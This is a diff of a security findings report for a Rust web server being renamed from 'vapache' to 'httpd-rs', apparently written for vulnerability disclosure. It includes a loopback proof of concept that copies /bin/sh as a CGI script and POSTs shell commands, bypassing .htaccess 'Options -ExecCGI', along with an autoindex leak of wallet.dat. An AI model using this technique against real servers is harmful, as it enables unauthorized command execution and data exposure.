@@ -1,8 +1,8 @@
-# vapache adversarial findings — Pass 9
+# httpd-rs adversarial findings — Pass 9
 
 **Target:** the current working tree at `HEAD 469266f`
 (`Expand test coverage and fix vulns`), rebuilt from source with
-`cargo build --release -p vapached`. The repository source was not modified for
+`cargo build --release -p httpd-rs`. The repository source was not modified for
 this pass; all fixtures live under `/tmp/opencode/p9-*`.
 
 **Environment:** Linux, loopback only. Apache 2.4.69 (Debian) was used as a
@@ -79,12 +79,12 @@ Content-Length: <body length>
 printf 'Content-Type: text/plain\r\n\r\n'; id
 ```
 
-Apache 2.4.69 reads the subdirectory `.htaccess` and returns `403`. Vapache
+Apache 2.4.69 reads the subdirectory `.htaccess` and returns `403`. httpd-rs
 returns `200` and executes the shell as the web user:
 
 ```text
 apache=403
-vapache=200
+httpd-rs=200
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -110,8 +110,8 @@ and configure `DirectoryIndex index.cgi`. A request for `/admin/`:
 ```text
 apache /admin/          -> 403
 apache /admin/index.cgi -> 403
-vapache /admin/          -> 200  WALLET-DIRINDEX-CGI
-vapache /admin/index.cgi -> 200  WALLET-DIRINDEX-CGI
+httpd-rs /admin/          -> 200  WALLET-DIRINDEX-CGI
+httpd-rs /admin/index.cgi -> 200  WALLET-DIRINDEX-CGI
 ```
 
 The directory request is authorized against the lexical path, where
@@ -127,7 +127,7 @@ The same target-scope loss affects autoindex policy. With a root
 
 ```text
 apache /list/   -> 403
-vapache /list/  -> 200, autoindex body contains wallet.dat
+httpd-rs /list/  -> 200, autoindex body contains wallet.dat
 ```
 
 The child policy is read by the initial plan and shown by `--explain`, but the
@@ -183,10 +183,10 @@ ln -s "$D/real/public" "$D/www/html"
 cp /bin/sh "$D/real/public/admin/sh.cgi"
 chmod 755 "$D/real/public/admin/sh.cgi"
 
-# The hardening policy Apache enforces and vapache loses.
+# The hardening policy Apache enforces and httpd-rs loses.
 printf 'Options -ExecCGI\n' > "$D/real/public/admin/.htaccess"
 
-cat > "$D/vapache.conf" <<EOF
+cat > "$D/httpd-rs.conf" <<EOF
 ServerRoot "$D"
 Listen 127.0.0.1:19431
 PidFile "$D/logs/v.pid"
@@ -213,7 +213,7 @@ printf "printf 'Content-Type: text/plain\\r\\n\\r\\n'; id; cat /etc/hostname\n" 
 
 curl -s -o "$D/abody" -w 'apache=%{http_code}\n' -X POST \
   --data-binary "@$D/payload" http://127.0.0.1:<apache-port>/admin/sh.cgi
-curl -s -o "$D/vbody" -w 'vapache=%{http_code}\n' -X POST \
+curl -s -o "$D/vbody" -w 'httpd-rs=%{http_code}\n' -X POST \
   --data-binary "@$D/payload" http://127.0.0.1:19431/admin/sh.cgi
 ```
 
@@ -221,12 +221,12 @@ Observed:
 
 ```text
 apache=403
-vapache=200
+httpd-rs=200
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 debian
 ```
 
-Apache's refusal is the `Options ExecCGI is off in this directory` check. Vapache
+Apache's refusal is the `Options ExecCGI is off in this directory` check. httpd-rs
 never applies that child policy after target re-authorization.
 
 The initial scope really is correct. `--explain /admin/sh.cgi` shows:
@@ -267,8 +267,8 @@ Observed:
 ```text
 apache /admin/          -> 403
 apache /admin/index.cgi -> 403
-vapache /admin/          -> 200  WALLET-DIRINDEX-CGI
-vapache /admin/index.cgi -> 200  WALLET-DIRINDEX-CGI
+httpd-rs /admin/          -> 200  WALLET-DIRINDEX-CGI
+httpd-rs /admin/index.cgi -> 200  WALLET-DIRINDEX-CGI
 ```
 
 No attacker file is needed here; the attacker triggers execution of an
@@ -291,7 +291,7 @@ the lexical root:
 
 ```text
 apache /list/   -> 403
-vapache /list/  -> 200, autoindex contains wallet.dat
+httpd-rs /list/  -> 200, autoindex contains wallet.dat
 ```
 
 ## Root cause
@@ -476,7 +476,7 @@ valid result merely because strip_prefix(root, T) failed.
 
 Extend `tests/adversarial_regressions.py` with the F59 fixtures and assert the
 Apache differential (`403` for `Options -ExecCGI`, `Options -Indexes`) as well
-as the vapache result. The existing `fs_target_outside_mapping_root_keeps_explicit_path`
+as the httpd-rs result. The existing `fs_target_outside_mapping_root_keeps_explicit_path`
 unit test must be inverted/replaced, not extended.
 
 ---
@@ -503,8 +503,8 @@ unit test must be inverted/replaced, not extended.
 
 * All fixtures are under `/tmp/opencode/p9-*`; the repository source was not
   edited for this pass.
-* `target/release/vapached` was rebuilt from `HEAD 469266f` with
-  `cargo build --release -p vapached` before the pass.
+* `target/release/httpd-rs` was rebuilt from `HEAD 469266f` with
+  `cargo build --release -p httpd-rs` before the pass.
 * Apache 2.4.69 was started with private loopback configs and only the modules
   needed for `Options`/`AddHandler`/CGI/autoindex.
 * The CGI proof uses `/bin/sh` copied to an executable `.cgi` file as a
